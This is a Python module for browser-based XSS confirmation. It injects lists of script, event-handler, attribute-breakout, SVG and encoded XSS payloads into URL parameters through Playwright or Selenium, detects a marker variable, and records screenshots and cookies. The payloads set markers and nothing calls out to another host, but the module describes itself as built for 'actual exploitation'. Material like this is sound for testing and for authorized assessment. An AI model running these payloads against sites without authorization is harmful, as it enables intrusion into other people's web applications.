"""
Advanced Browser-Based Exploitation Module

This module provides real browser-based exploitation confirmation for XSS vulnerabilities.
Instead of just detecting potential XSS, it actually attempts to execute JavaScript in a real
browser context using Playwright/Selenium and confirms successful execution.

Features:
- Real browser automation (Playwright preferred, Selenium fallback)
- Context-aware payload generation (HTML, attribute, JavaScript, SVG contexts)
- Multiple payload variations (tag closing, attribute breaking, encoded, event handlers)
- JavaScript execution detection (alerts, DOM mutations, console logs)
- Visual proof capture (screenshots before/after)
- Cookie and localStorage exfiltration attempts
- Success confirmation through multiple indicators

This is production-grade code designed for actual exploitation, not just detection.
"""

import logging
import time
import base64
import json
import hashlib
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime
from pathlib import Path

logger = logging.getLogger(__name__)

# Try Playwright first (preferred)
try:
    from playwright.sync_api import sync_playwright, Page, Browser, TimeoutError as PlaywrightTimeout
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False
    logger.info("Playwright not available, will use Selenium fallback")

# Selenium as fallback
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.common.exceptions import TimeoutException, WebDriverException
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False
    logger.warning("Selenium not available, browser exploitation will be disabled")


class AdvancedBrowserExploit:
    """
    Advanced browser-based exploitation system for XSS vulnerabilities.
    
    This class provides real browser automation to confirm XSS exploitation
    through actual JavaScript execution in a browser context.
    """
    
    # XSS execution marker - used to detect successful JavaScript execution
    XSS_MARKER = '__xss_triggered'
    
    # Context-aware XSS payloads
    CONTEXT_PAYLOADS = {
        'html': [
            # Classic script injection
            f'<script>window.{XSS_MARKER}=true;</script>',
            f'<img src=x onerror="window.{XSS_MARKER}=true">',
            f'<svg/onload="window.{XSS_MARKER}=true">',
            f'<iframe src="javascript:parent.window.{XSS_MARKER}=true">',
            f'<body onload="window.{XSS_MARKER}=true">',
            # DOM mutation payloads
            '<div id="xss-marker" style="display:none">XSS_CONFIRMED</div>',
            '<script>document.body.setAttribute("data-xss", "confirmed");</script>',
        ],
        'attribute': [
            # Break out of attribute
            f'" onload="window.{XSS_MARKER}=true',
            f'\' onload=\'window.{XSS_MARKER}=true',
            f'"><script>window.{XSS_MARKER}=true;</script><div class="',
            f'\'><script>window.{XSS_MARKER}=true;</script><div class=\'',
            # Event handler injection
            f'" onfocus="window.{XSS_MARKER}=true" autofocus="',
            f'\' onfocus=\'window.{XSS_MARKER}\' autofocus=\'',
        ],
        'javascript': [
            # JavaScript context escape
            '\'-alert(1)-\'',
            '"-alert(1)-"',
            f'</script><script>window.{XSS_MARKER}=true;</script><script>',
            f'}});window.{XSS_MARKER}=true;//',
            f'\'; window.{XSS_MARKER}=true; //',
            f'\"; window.{XSS_MARKER}=true; //',
        ],
        'svg': [
            # SVG-based XSS
            f'<svg><script>window.{XSS_MARKER}=true;</script></svg>',
            f'<svg/onload="window.{XSS_MARKER}=true">',
            f'<svg><animate onbegin="window.{XSS_MARKER}=true">',
            f'<svg><set attributeName=onmouseover to="window.{XSS_MARKER}=true">',
        ],
        'encoded': [
            # URL encoded
            f'%3Cscript%3Ewindow.{XSS_MARKER}=true;%3C/script%3E',
            # HTML entity encoded
            f'&lt;script&gt;window.{XSS_MARKER}=true;&lt;/script&gt;',
            # Unicode encoded
            f'\\u003cscript\\u003ewindow.{XSS_MARKER}=true;\\u003c/script\\u003e',
            # Base64 (requires decode on target)
            f'<img src=x onerror="eval(atob(\'d2luZG93Ll9feHNzX3RyaWdnZXJlZD10cnVlOw==\'))">',
        ],
    }
    
    def __init__(self, use_playwright: bool = True, headless: bool = True):
        """
        Initialize the browser exploit module.
        
        Args:
            use_playwright: Prefer Playwright over Selenium
            headless: Run browser in headless mode
        """
        self.use_playwright = use_playwright and HAS_PLAYWRIGHT
        self.headless = headless
        self.browser = None
        self.playwright = None
        self.selenium_driver = None
        
    def __enter__(self):
        """Context manager entry."""
        return self
        
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit - cleanup resources."""
        self.cleanup()
        
    def cleanup(self):
        """Clean up browser resources."""
        try:
            if self.playwright:
                if self.browser:
                    self.browser.close()
                self.playwright.stop()
            elif self.selenium_driver:
                self.selenium_driver.quit()
        except Exception as e:
            logger.warning(f"Error during cleanup: {e}")
    
    def attempt_xss_exploitation(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = 'GET',
        additional_params: Optional[Dict[str, str]] = None,
        context_hint: Optional[str] = None,
        timeout: int = 10
    ) -> Dict[str, Any]:
        """
        Attempt XSS exploitation in a real browser.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter name
            method: HTTP method (GET or POST)
            additional_params: Other parameters to include
            context_hint: Hint about injection context (html, attribute, javascript, svg)
            timeout: Page load timeout in seconds
            
        Returns:
            Dictionary with exploitation results:
            {
                'success': bool,
                'exploited': bool,
                'payload_used': str,
                'context': str,
                'evidence': dict,
                'screenshot_before': str (base64),
                'screenshot_after': str (base64),
                'dom_changes': list,
                'console_logs': list,
                'cookies_exfiltrated': dict,
                'execution_time': float
            }
        """
        start_time = time.time()
        result = {
            'success': False,
            'exploited': False,
            'payload_used': None,
            'context': context_hint or 'unknown',
            'evidence': {},
            'screenshot_before': None,
            'screenshot_after': None,
            'dom_changes': [],
            'console_logs': [],
            'cookies_exfiltrated': {},
            'execution_time': 0
        }
        
        if not HAS_PLAYWRIGHT and not HAS_SELENIUM:
            result['error'] = 'No browser automation library available'
            return result
        
        try:
            # Initialize browser
            if self.use_playwright:
                success = self._exploit_with_playwright(
                    url, parameter, method, additional_params, context_hint, timeout, result
                )
            else:
                success = self._exploit_with_selenium(
                    url, parameter, method, additional_params, context_hint, timeout, result
                )
            
            result['success'] = success
            result['execution_time'] = time.time() - start_time
            
        except Exception as e:
            logger.error(f"Browser exploitation error: {e}")
            result['error'] = str(e)
        finally:
            self.cleanup()
        
        return result
    
    def _exploit_with_playwright(
        self,
        url: str,
        parameter: Optional[str],
        method: str,
        additional_params: Optional[Dict[str, str]],
        context_hint: Optional[str],
        timeout: int,
        result: Dict[str, Any]
    ) -> bool:
        """Attempt exploitation using Playwright."""
        self.playwright = sync_playwright().start()
        self.browser = self.playwright.chromium.launch(headless=self.headless)
        context = self.browser.new_context()
        page = context.new_page()
        
        # Capture console logs
        console_messages = []
        page.on("console", lambda msg: console_messages.append({
            'type': msg.type,
            'text': msg.text,
            'location': msg.location
        }))
        
        # Take screenshot before
        try:
            page.goto(url, timeout=timeout * 1000)
            result['screenshot_before'] = base64.b64encode(page.screenshot()).decode()
        except Exception as e:
            logger.warning(f"Failed to capture before screenshot: {e}")
        
        # Try different payload contexts
        contexts_to_try = [context_hint] if context_hint else list(self.CONTEXT_PAYLOADS.keys())
        
        for ctx in contexts_to_try:
            if ctx not in self.CONTEXT_PAYLOADS:
                continue
                
            for payload in self.CONTEXT_PAYLOADS[ctx]:
                try:
                    # Build URL with payload
                    test_url = self._build_exploit_url(url, parameter, payload, method, additional_params)
                    
                    # Navigate to URL with payload
                    page.goto(test_url, timeout=timeout * 1000, wait_until='networkidle')
                    
                    # Wait a bit for JavaScript to execute
                    time.sleep(0.5)
                    
                    # Check for XSS markers
                    xss_triggered = page.evaluate(f'() => window.{self.XSS_MARKER} === true')
                    xss_marker_found = page.evaluate('() => document.getElementById("xss-marker") !== null')
                    body_has_marker = page.evaluate('() => document.body.getAttribute("data-xss") === "confirmed"')
                    
                    if xss_triggered or xss_marker_found or body_has_marker:
                        result['exploited'] = True
                        result['payload_used'] = payload
                        result['context'] = ctx
                        result['evidence'] = {
                            'xss_triggered': xss_triggered,
                            'marker_found': xss_marker_found,
                            'body_marker': body_has_marker,
                            'url_used': test_url
                        }
                        
                        # Capture screenshot after exploitation
                        result['screenshot_after'] = base64.b64encode(page.screenshot()).decode()
                        
                        # Try to exfiltrate cookies
                        try:
                            cookies = page.context.cookies()
                            result['cookies_exfiltrated'] = {c['name']: c['value'] for c in cookies}
                        except Exception:
                            pass
                        
                        # Capture DOM changes
                        try:
                            dom_snapshot = page.evaluate('() => document.documentElement.outerHTML')
                            if 'xss' in dom_snapshot.lower() or self.XSS_MARKER in dom_snapshot:
                                result['dom_changes'].append('XSS marker found in DOM')
                        except Exception:
                            pass
                        
                        result['console_logs'] = console_messages
                        
                        logger.info(f"XSS exploitation successful with payload: {payload}")
                        return True
                        
                except PlaywrightTimeout:
                    logger.debug(f"Timeout with payload: {payload}")
                    continue
                except Exception as e:
                    logger.debug(f"Error testing payload {payload}: {e}")
                    continue
        
        return False
    
    def _exploit_with_selenium(
        self,
        url: str,
        parameter: Optional[str],
        method: str,
        additional_params: Optional[Dict[str, str]],
        context_hint: Optional[str],
        timeout: int,
        result: Dict[str, Any]
    ) -> bool:
        """Attempt exploitation using Selenium."""
        options = ChromeOptions()
        if self.headless:
            options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        
        self.selenium_driver = webdriver.Chrome(options=options)
        self.selenium_driver.set_page_load_timeout(timeout)
        
        try:
            # Take screenshot before
            self.selenium_driver.get(url)
            result['screenshot_before'] = self.selenium_driver.get_screenshot_as_base64()
        except Exception as e:
            logger.warning(f"Failed to capture before screenshot: {e}")
        
        # Try different payload contexts
        contexts_to_try = [context_hint] if context_hint else list(self.CONTEXT_PAYLOADS.keys())
        
        for ctx in contexts_to_try:
            if ctx not in self.CONTEXT_PAYLOADS:
                continue
                
            for payload in self.CONTEXT_PAYLOADS[ctx]:
                try:
                    # Build URL with payload
                    test_url = self._build_exploit_url(url, parameter, payload, method, additional_params)
                    
                    # Navigate to URL with payload
                    self.selenium_driver.get(test_url)
                    time.sleep(0.5)
                    
                    # Check for XSS markers
                    xss_triggered = self.selenium_driver.execute_script(f'return window.{self.XSS_MARKER} === true')
                    xss_marker_found = self.selenium_driver.execute_script(
                        'return document.getElementById("xss-marker") !== null'
                    )
                    body_has_marker = self.selenium_driver.execute_script(
                        'return document.body.getAttribute("data-xss") === "confirmed"'
                    )
                    
                    if xss_triggered or xss_marker_found or body_has_marker:
                        result['exploited'] = True
                        result['payload_used'] = payload
                        result['context'] = ctx
                        result['evidence'] = {
                            'xss_triggered': xss_triggered,
                            'marker_found': xss_marker_found,
                            'body_marker': body_has_marker,
                            'url_used': test_url
                        }
                        
                        # Capture screenshot after exploitation
                        result['screenshot_after'] = self.selenium_driver.get_screenshot_as_base64()
                        
                        # Try to exfiltrate cookies
                        try:
                            cookies = self.selenium_driver.get_cookies()
                            result['cookies_exfiltrated'] = {c['name']: c['value'] for c in cookies}
                        except Exception:
                            pass
                        
                        # Capture console logs (Selenium has limitations here)
                        try:
                            logs = self.selenium_driver.get_log('browser')
                            result['console_logs'] = logs
                        except Exception:
                            pass
                        
                        logger.info(f"XSS exploitation successful with payload: {payload}")
                        return True
                        
                except TimeoutException:
                    logger.debug(f"Timeout with payload: {payload}")
                    continue
                except Exception as e:
                    logger.debug(f"Error testing payload {payload}: {e}")
                    continue
        
        return False
    
    def _build_exploit_url(
        self,
        base_url: str,
        parameter: Optional[str],
        payload: str,
        method: str,
        additional_params: Optional[Dict[str, str]]
    ) -> str:
        """Build URL with XSS payload injected."""
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        
        # Convert to single-value dict
        params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        
        # Add additional params
        if additional_params:
            params.update(additional_params)
        
        # Inject payload
        if parameter:
            params[parameter] = payload
        else:
            # If no specific parameter, try common ones
            for param_name in ['q', 'search', 'query', 'input', 'text', 'name']:
                if param_name in params:
                    params[param_name] = payload
                    break
            else:
                # Just add as 'q' parameter
                params['q'] = payload
        
        # Rebuild URL
        new_query = urlencode(params)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url
    
    @staticmethod
    def generate_context_aware_payloads(context: str = 'html') -> List[str]:
        """
        Generate context-aware XSS payloads.
        
        Args:
            context: Injection context (html, attribute, javascript, svg, encoded)
            
        Returns:
            List of payloads
        """
        if context in AdvancedBrowserExploit.CONTEXT_PAYLOADS:
            return AdvancedBrowserExploit.CONTEXT_PAYLOADS[context].copy()
        return []
    
    @staticmethod
    def detect_injection_context(response_html: str, payload_marker: str = 'XSS_TEST_MARKER') -> str:
        """
        Detect where a test payload appears in the response to determine context.
        
        Args:
            response_html: HTML response containing the payload marker
            payload_marker: Marker string to search for
            
        Returns:
            Detected context: 'html', 'attribute', 'javascript', 'svg', or 'unknown'
        """
        import re
        
        # Find the marker in response
        if payload_marker not in response_html:
            return 'unknown'
        
        # Get context around marker (100 chars before and after)
        marker_pos = response_html.find(payload_marker)
        context_start = max(0, marker_pos - 100)
        context_end = min(len(response_html), marker_pos + len(payload_marker) + 100)
        context_snippet = response_html[context_start:context_end]
        
        # Check for JavaScript context
        if '<script' in context_snippet.lower() and '</script>' in context_snippet.lower():
            return 'javascript'
        
        # Check for SVG context
        if '<svg' in context_snippet.lower():
            return 'svg'
        
        # Check for attribute context (inside a tag attribute)
        # Look for tag with attribute containing marker
        attr_pattern = r'<[^>]+\s+\w+=["\']?[^"\']*' + re.escape(payload_marker)
        if re.search(attr_pattern, context_snippet, re.IGNORECASE):
            return 'attribute'
        
        # Default to HTML context
        return 'html'


def get_advanced_browser_exploit(use_playwright: bool = True, headless: bool = True) -> AdvancedBrowserExploit:
    """
    Factory function to get browser exploit instance.
    
    Args:
        use_playwright: Prefer Playwright over Selenium
        headless: Run browser in headless mode
        
    Returns:
        AdvancedBrowserExploit instance
    """
    return AdvancedBrowserExploit(use_playwright=use_playwright, headless=headless)
